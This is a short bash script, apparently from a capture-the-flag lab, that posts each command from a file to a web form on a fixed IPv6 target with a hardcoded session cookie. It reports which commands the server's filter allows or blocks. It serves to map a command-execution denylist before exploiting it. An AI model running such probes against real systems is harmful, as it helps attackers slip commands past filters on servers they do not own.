#/bin/bash

command_file=$1
for cmd in $(cat ${command_file}); do
    curl -s -6 -X POST "http://[dead:beef::250:56ff:feb2:7cff]:80/" -H "Cookie: PHPSESSID=697rbtjrbikamspvck4p3u309d" -d "command=${cmd}" | grep -q "Command is not allowed."
    if [ $? -eq 1 ]; then
        echo -e "  \e[42m${cmd}\e[49m allowed";
    else
        echo -e "  \e[41m${cmd}\e[49m blocked";
    fi;
done

